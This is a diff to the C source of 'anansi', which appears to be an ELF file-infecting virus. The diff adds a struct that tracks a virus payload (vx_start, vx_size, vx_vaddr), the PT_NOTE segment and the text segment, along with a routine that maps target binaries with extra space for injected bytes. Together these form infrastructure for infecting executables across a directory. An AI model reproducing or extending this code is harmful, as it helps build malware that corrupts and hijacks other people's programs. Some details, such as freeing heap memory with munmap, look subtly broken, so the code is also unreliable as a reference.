@@ -9,6 +9,16 @@
 #include<stdint.h>
 #include<stdbool.h>
 #include<stdarg.h>
+#include<elf.h>
+
+/* process_elf flags */
+#define PROCESS_ELF_EHDR 0x00000001
+#define PROCESS_ELF_PHDR 0x00000010
+#define PROCESS_ELF_SHDR 0x00000100
+#define PROCESS_ELF_O_RDONLY 0x00000001
+#define PROCESS_ELF_O_RDWR 0x00000010
+#define PROCESS_ELF_O_ATTRONLY 0x00000100
+#define MAGIC_INITIALIZER_RAN 0xDEADBEEF
 
 #define STDOUT STDOUT_FILENO
 #define FAILURE -1
@@ -25,14 +35,42 @@
 	#define MAX_TARGET 3
 #endif
 
+typedef struct elfbin {
+	Elf64_Ehdr *ehdr;
+	Elf64_Phdr *phdr;
+	Elf64_Shdr *shdr;
+
+	int fd;
+	int perm;
+	int orig_size;
+	int new_size;
+	char *f_path;
+
+	void *read_only_mem;
+	void *write_only_mem;
+	int initializer_ran;
+
+	uint64_t vx_size;
+	uint8_t  *vx_start;
+
+	int pt_note_entry;
+	int text_seg_ndx;
+
+	uint64_t vx_vaddr;
+}Elfbin;
+
 extern unsigned long real_start;
+
 // functions unique to anansi
 char *create_full_path(char *directory, char *filename);
+void process_elf_initialize(Elfbin *c);
+int process_elf(Elfbin *c, int attr, int perm, int len, char *p);
+void process_elf_free(Elfbin *c);
 
 #ifdef DEBUG
-int anansi_printf(char *format, ...);
-char *itoa(void *data_num, int base, int var_type);
-char *itoa_final(long n, int base);
+	int anansi_printf(char *format, ...);
+	char *itoa(void *data_num, int base, int var_type);
+	char *itoa_final(long n, int base);
 #endif
 
 
@@ -158,6 +196,163 @@ clean_up:
 	if(cwd_listings != NULL)
 		anansi_munmap(cwd_listings, DIR_LISTING_SIZE);
 	anansi_exit(status);
+}
+
+/* c - Elfbin type struct where process_elf will write to.
+ * attr - Which portions of the elf file to load (elf header, program header, section header)
+ * perm - accept PROCESS_ELF_O_RDONLY, PROCESS_ELF_O_WRONLY, PROCESS_ELF_O_ATTRONLY
+ *        + PROCESS_ELF_O_RDONLY will produce a reference (c->read_only_mem) to the entire file mapping
+ *        where underlying attributes (ehdr,shdr and phdr for example) will ba based on.
+ *
+ *        + PROCESS_ELF_O_RDWR will produce two mappings one of which is the same as PROCESS_ELF_O_RDONLY
+ *        and the other the length of the binary plus 'len' parameter. The contents of read_only_mem is copied over
+ *        into that write_only_mem mapping.
+ *
+ *        + PROCESS_ELF_O_ATTRONLY will retrieve the attributes specified. Attributes are
+ *        indepently allocated (not a reference to read_only_mem).
+ *
+ * len - additional space allocated for adding bytes to to the binary (stat.st_size + len)
+ * p - path to the targetted binary.
+ */
+
+
+int process_elf(Elfbin *target, int attr, int perm, int len, char *p)
+{
+	int fd;
+	void *mem = NULL;
+	struct stat fs;
+
+	Elf64_Ehdr *ehdr;
+	Elf64_Phdr *phdr;
+	Elf64_Shdr *shdr;
+
+	if((fd = anansi_open(p, O_RDONLY, 0)) < 0)
+		return -1;
+
+	if(anansi_stat(p, &fs) < 0)
+		return -1;
+	if(fs.st_size < (sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr) + sizeof(Elf64_Shdr)))
+		return -1;
+
+	if((mem = anansi_mmap(0, fs.st_size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
+		return -1;
+
+	if(anansi_strncmp(mem, ELFMAG, anansi_strlen(ELFMAG)) < 0)
+		return -1;
+
+	ehdr = (Elf64_Ehdr *)mem;
+	phdr = (Elf64_Phdr *)(mem + (((Elf64_Ehdr *)mem)->e_phoff));
+	shdr = (Elf64_Shdr *)(mem + ehdr->e_shoff);
+
+
+	if(perm & PROCESS_ELF_O_RDONLY || perm & PROCESS_ELF_O_RDWR) {
+		target->read_only_mem = mem;
+	}
+
+
+	if(perm != PROCESS_ELF_O_ATTRONLY) {
+		target->orig_size = fs.st_size;
+		target->fd = fd;
+		target->perm = perm; //need this for freeing fields with independent heap allocations via anansi_malloc()
+	}
+
+	if(perm & PROCESS_ELF_O_RDWR) {
+		target->write_only_mem = anansi_malloc(fs.st_size + len);
+		if(target->write_only_mem == NULL)
+			return -1;
+		anansi_memcpy(target->write_only_mem, target->read_only_mem, fs.st_size);
+		target->new_size = fs.st_size + len;
+	}
+
+	if(attr & PROCESS_ELF_EHDR) {
+		if(perm == PROCESS_ELF_O_ATTRONLY) {
+			target->ehdr = anansi_malloc(sizeof(Elf64_Ehdr));
+			if(target->ehdr == NULL)
+				return -1;
+			anansi_memcpy(target->ehdr, ehdr, sizeof(Elf64_Ehdr));
+		}else {
+			target->ehdr = ehdr;
+		}
+	}
+
+	if(attr & PROCESS_ELF_PHDR) {
+		if(perm == PROCESS_ELF_O_ATTRONLY) {
+			target->phdr = anansi_malloc(sizeof(Elf64_Phdr));
+			if(target->phdr == NULL)
+				return -1;
+			anansi_memcpy(target->phdr, phdr, sizeof(Elf64_Phdr));
+		}else {
+			target->phdr = phdr;
+			for(int p_entry = 0; p_entry < target->ehdr->e_phnum; p_entry++)
+				if(target->phdr[p_entry].p_type == PT_NOTE)
+					target->pt_note_entry = p_entry;
+
+			for(int p_entry = 0; (p_entry < target->ehdr->e_phnum) && (!target->text_seg_ndx); p_entry++)
+				if(target->phdr[p_entry].p_type == PT_LOAD)
+					if(target->phdr[p_entry].p_flags == (PF_X | PF_R))
+						target->text_seg_ndx = p_entry;
+		}
+	}
+
+	if(attr & PROCESS_ELF_SHDR) {
+		if(perm == PROCESS_ELF_O_ATTRONLY) {
+			target->shdr = anansi_malloc(sizeof(Elf64_Shdr));
+			if(target->shdr == NULL)
+				return -1;
+			anansi_memcpy(target->shdr, shdr, sizeof(Elf64_Shdr));
+		}else {
+			target->shdr = shdr;
+		}
+	}
+
+	return 0;
+
+}
+
+/*
+ - Necessary for process_elf_free() to work correctly.
+*/
+
+void process_elf_initialize(Elfbin *c)
+{
+	anansi_memset(c, 0, sizeof(Elfbin));
+	c->initializer_ran = MAGIC_INITIALIZER_RAN;
+}
+
+/*
+ - Free pointers in the struct (Elfbin) based on passwd in attributes.
+ - Close fd field.
+ - Zero out other fields (discourage reuse of the reference).
+*/
+
+void process_elf_free(Elfbin *c)
+{
+	if(c->initializer_ran == MAGIC_INITIALIZER_RAN) {
+		if(c->perm == PROCESS_ELF_O_ATTRONLY) {
+			if(c->ehdr != NULL)
+				anansi_munmap(c->ehdr, sizeof(Elf64_Ehdr));
+			if(c->phdr != NULL)
+				anansi_munmap(c->phdr, sizeof(Elf64_Phdr));
+			if(c->shdr != NULL)
+				anansi_munmap(c->shdr, sizeof(Elf64_Shdr));
+		}
+
+
+		if(c->perm == PROCESS_ELF_O_RDONLY || c->perm == PROCESS_ELF_O_RDWR)
+			if(c->read_only_mem != NULL)
+				anansi_munmap(c->read_only_mem, c->orig_size);
+
+
+		if(c->perm == PROCESS_ELF_O_RDWR)
+			if(c->write_only_mem != NULL)
+				anansi_munmap(c->write_only_mem, c->new_size);;
+
+
+		anansi_close(c->fd);
+		c->orig_size = 0;
+		c->new_size = 0;
+		c->perm = 0;
+	}
 }
 
 char *create_full_path(char *directory, char *filename)
